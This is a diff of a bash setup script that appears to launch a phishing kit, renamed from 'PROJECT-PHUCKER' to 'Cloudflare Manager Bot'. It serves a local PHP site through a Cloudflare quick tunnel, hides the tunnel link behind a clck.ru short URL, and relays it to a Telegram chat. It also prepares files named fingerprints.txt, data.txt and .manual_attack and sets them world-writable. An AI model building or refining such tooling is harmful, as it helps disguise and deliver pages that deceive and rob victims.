@@ -1,137 +1,198 @@
 #!/bin/bash
 
-# Banner for PROJECT-PHUCKER
-echo "==============================="
-echo "       PROJECT-PHUCKER         "
-echo "==============================="
+# Banner for the Cloudflare Manager Bot
+echo '  ____       _   _   _       ____  _         _____           _       _             
+ |  _ \ __ _| |_| |_| | ___ / ___|| |_ __ _|  ___|__   ___ | |_   _| | ___  _ __  
+ | |_) / _` | __| __| |/ _ \ |    | __/ _` | |_ / _ \ / _ \| | | | | |/ _ \|  _ \ 
+ |  _ < (_| | |_| |_| |  __/ |___| || (_| |  _| (_) | (_) | | |_| | | (_) | | | |
+ |_| \_\__,_|\__|\__|_|\___|\____|\__\__,_|_|  \___/ \___/|_|\__,_|_|\___/|_| |_|'
 
-# Function to install required packages
-install_packages() {
-    echo -e "\n[+] Installing required packages..."
+# Function to remove old Python installations and install fresh Python
+install_fresh_python() {
+    echo -e "\n[+] Removing any existing Python installations..."
+    pkg uninstall python -y
 
-    # Check if running on Android
-    if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if ! command -v proot &> /dev/null; then
-            echo -e "[+] Installing package: proot"
-            pkg install proot resolv-conf -y
-        fi
-    fi
+    echo -e "\n[+] Installing fresh Python..."
+    pkg update -y
+    pkg install python -y
 
-    # Check for essential packages
-    if ! command -v php &> /dev/null || ! command -v wget &> /dev/null || ! command -v curl &> /dev/null || ! command -v unzip &> /dev/null; then
-        echo -e "[+] Installing required packages..."
-        
-        if command -v pkg &> /dev/null; then
-            pkg install php wget curl unzip -y
-        elif command -v apt-get &> /dev/null; then
-            apt-get install php wget curl unzip -y
-        elif command -v pacman &> /dev/null; then
-            sudo pacman -S php wget curl unzip --noconfirm
-        elif command -v dnf &> /dev/null; then
-            sudo dnf -y install php wget curl unzip
-        else
-            echo -e "[!] Unsupported package manager. Install packages manually."
-            exit 1
-        fi
-    else
-        echo -e "[+] Mip packages already installed."
-    fi
-
-    # Check if Composer is installed, if not install it
-    if ! command -v composer &> /dev/null; then
-        echo -e "\n[+] Installing Composer..."
-        php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"
-        php composer-setup.php --install-dir=/usr/local/bin --filename=composer
-        php -r "unlink('composer-setup.php');"
-    else
-        echo -e "[+] Composer already installed."
-    fi
+    echo -e "\n[+] Installing pip and virtualenv..."
+    pip install --upgrade pip
+    pip install virtualenv
 }
 
-# Function to create necessary files and install dependencies to webroot
-create_files_and_install_dependencies() {
-    echo -e "\n[+] Creating necessary files and installing dependencies to webroot..."
+# Function to install necessary packages and libraries
+install_packages_and_libraries() {
+    echo -e "\n[+] Installing required packages and libraries..."
 
-    # Check if .www directory exists, create if not
-    if [[ ! -d ".www" ]]; then
-        mkdir .www
-    fi
+    pkg install php curl wget unzip -y
+    install_fresh_python
 
-    # Check if config.ini exists in .www folder, create if not
-    if [[ ! -f ".www/config.ini" ]]; then
-        echo -e "\n[+] Creating config.ini in .www folder..."
-        cat <<EOF > .www/config.ini
-token = your_telegram_bot_token
-chat_id = your_telegram_chat_id
-EOF
-    else
-        echo -e "[+] config.ini already exists."
-    fi
+    echo -e "\n[+] Creating Python virtual environment..."
+    virtualenv venv
+    source venv/bin/activate
 
-    # Install PHPMailer to .www folder if not already installed
-    if [[ ! -d ".www/vendor" ]]; then
-        echo -e "\n[+] Installing PHPMailer to .www folder..."
-        cd .www
-        composer require phpmailer/phpmailer
-        cd ..
-    else
-        echo -e "[+] PHPMailer already installed."
-    fi
+    echo -e "\n[+] Installing required Python libraries..."
+    pip install telepot requests
 }
 
-# Function to set permissions
+# Function to set permissions for necessary files and directories
 set_permissions() {
-    echo -e "\n[+] Setting permissions..."
-
-    # Ensure .tunnels_log directory exists
-    mkdir -p .tunnels_log
-
-    # Set permissions for necessary files and directories
-    chmod -R 777 .www .tunnels_log
+    chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
 }
 
-# Function to start server
-setup_and_start_server() {
-    echo -e "\n[+] Setting up and starting server..."
+# Function to create necessary directories
+create_directories() {
+    mkdir -p .tunnels_log .www .host
+}
 
-    # Start PHP server
+# Function to create or update configuration file
+create_or_update_config() {
+    config_file=".www/config.ini"
+    if [[ -f $config_file ]]; then
+        read -p "config.ini already exists. Do you want to update it? (y/n): " choice
+        if [[ $choice != "y" ]]; then
+            echo "Config update skipped."
+            return
+        fi
+    fi
+
+    read -p "Enter your Telegram bot token: " token
+    read -p "Enter your Telegram chat ID: " chat_id
+
+    cat <<EOL >$config_file
+[telegram]
+token = $token
+chat_id = $chat_id
+EOL
+
+    echo "Config file created/updated successfully."
+}
+
+# Function to start PHP server
+start_php_server() {
     cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
-    echo "[+] PHP server started at http://127.0.0.1:8080"
 }
 
-# Function to start Cloudflared tunnel
+# Function to start Cloudflared tunnel and shorten URL
 start_cloudflared() {
-    echo -e "\n[+] Starting Cloudflared..."
-
+    echo -ne "\nStarting Cloudflared..."
     if [[ $(command -v termux-chroot) ]]; then
-        termux-chroot ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
+        termux-chroot ./.host/cloudflared tunnel -url http://127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
     else
-        ./.host/cloudflared tunnel -url 127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
+        ./.host/cloudflared tunnel -url http://127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
     fi
 
     sleep 12
+    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
+    shortened_url=$(curl -s https://clck.ru/--\?url\=${cldflr_url})
 
-    # Retrieve Cloudflared URL from log
-    if [[ -f .tunnels_log/.cloudfl.log ]]; then
-        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
-        echo -e "\n[+] Cloudflared URL: ${cldflr_url}"
+    echo -e "\nCloudflared URL: ${cldflr_url}"
+    echo -e "\nShortened URL: ${shortened_url}"
 
-        # Check if config.ini exists in .www folder and send URL to Telegram if configured
-        if [[ -f .www/config.ini ]]; then
-            TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
-            TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
-            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage -d text="Cloudflared URL: ${cldflr_url}" -d chat_id=${TELEGRAM_CHAT_ID} > /dev/null
-        else
-            echo "[-] config.ini not found in .www folder. Cannot send URL to Telegram."
-        fi
+    if [[ -f .www/config.ini ]]; then
+        TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
+        TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
+        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" -d "text=Cloudflared URL: ${cldflr_url}\nShortened URL: ${shortened_url}&chat_id=${TELEGRAM_CHAT_ID}" > /dev/null
     else
-        echo "[-] .tunnels_log/.cloudfl.log not found. Cloudflared URL retrieval failed."
+        echo "config.ini not found in .www folder. Cannot send URL to Telegram."
     fi
 }
 
+# Function to setup and run Telegram bot
+setup_telegram_bot() {
+    config_file=".www/config.ini"
+    if [[ ! -f $config_file ]]; then
+        echo "config.ini not found. Please run the setup again."
+        exit 1
+    fi
+
+    TELEGRAM_TOKEN=$(grep 'token' $config_file | cut -d '=' -f 2 | xargs)
+    TELEGRAM_CHAT_ID=$(grep 'chat_id' $config_file | cut -d '=' -f 2 | xargs)
+
+    # Write Python script for Telegram bot
+    cat > cloudflare_manager_bot.py <<EOF
+import sys
+import time
+import telepot
+import requests
+import subprocess
+import re
+from telepot.loop import MessageLoop
+from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton
+
+TELEGRAM_TOKEN = '${TELEGRAM_TOKEN}'
+bot = telepot.Bot(TELEGRAM_TOKEN)
+tunnel_process = None
+
+def handle(msg):
+    content_type, chat_type, chat_id = telepot.glance(msg)
+    if content_type == 'text':
+        command = msg['text']
+        if command == '/start':
+            bot.sendMessage(chat_id, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
+                keyboard=[
+                    [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
+                    [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Update Bot')]
+                ]
+            ))
+        elif command == 'Start Tunnel':
+            start_tunnel(chat_id)
+        elif command == 'Stop Tunnel':
+            stop_tunnel(chat_id)
+        elif command == 'Get Tunnel URL':
+            get_tunnel_url(chat_id)
+        elif command == 'Update Bot':
+            update_bot(chat_id)
+
+def start_tunnel(chat_id):
+    global tunnel_process
+    bot.sendMessage(chat_id, "Starting Cloudflared tunnel...")
+    tunnel_process = subprocess.Popen(['./.host/cloudflared', 'tunnel', '-url', 'http://127.0.0.1:8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    time.sleep(10)
+    bot.sendMessage(chat_id, "Tunnel started.")
+
+def stop_tunnel(chat_id):
+    global tunnel_process
+    if tunnel_process:
+        tunnel_process.terminate()
+        bot.sendMessage(chat_id, "Tunnel stopped.")
+    else:
+        bot.sendMessage(chat_id, "No tunnel running.")
+
+def get_tunnel_url(chat_id):
+    try:
+        with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
+            log_contents = log_file.read()
+        cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
+        shortened_url = requests.get(f"https://clck.ru/--?url={cldflr_url}").text
+        bot.sendMessage(chat_id, f"Cloudflared URL: {cldflr_url}\nShortened URL: {shortened_url}")
+    except Exception as e:
+        bot.sendMessage(chat_id, f"Error retrieving URL: {e}")
+
+def update_bot(chat_id):
+    bot.sendMessage(chat_id, "Updating bot... (Functionality under construction)")
+
+MessageLoop(bot, handle).run_as_thread()
+print('Bot is listening...')
+
+while True:
+    time.sleep(10)
+EOF
+
+    # Run the Python script for the bot
+    echo -e "\n[+] Running the Telegram bot..."
+    source venv/bin/activate
+    python3 cloudflare_manager_bot.py &
+}
+
 # Main script execution
-install_packages
-create_files_and_install_dependencies
+install_packages_and_libraries
+create_directories
 set_permissions
-setup_and_start_server
+create_or_update_config
+start_php_server
 start_cloudflared
+setup_telegram_bot
+
+echo -e "\n[+] Setup complete. The Cloudflare Manager Bot is now running."
